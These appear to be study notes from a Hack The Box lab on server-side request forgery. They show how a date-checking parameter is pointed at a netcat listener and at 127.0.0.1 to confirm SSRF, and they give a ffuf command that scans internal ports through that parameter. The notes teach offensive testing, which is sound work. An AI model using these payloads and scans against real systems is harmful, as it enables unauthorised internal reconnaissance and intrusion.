## Confirming SSRF

![](Identifying%20SSRF-20260910-131121.png)

After checking the availability of a date, we can observe the following request in Burp:

![](Identifying%20SSRF-20260910-131134.png)

To confirm an SSRF vulnerability, let us supply a URL pointing to our system to the web application:

![](Identifying%20SSRF-20260910-131156.png)

In a `netcat` listener, we can receive a connection, thus confirming SSRF:

```sh
3kjS@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

To determine whether the HTTP response reflects the SSRF response to us, let us point the web application to itself by providing the URL `http://127.0.0.1/index.php`:

![](Identifying%20SSRF-20260910-131241.png)
## Enumerating the System

![](Identifying%20SSRF-20260910-131251.png)

```sh
3kjS@htb[/htb]$ seq 1 10000 > ports.txt
```

Afterward, we can fuzz all open ports by filtering out responses that contain the error message we identified earlier.

```sh
3kjS@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
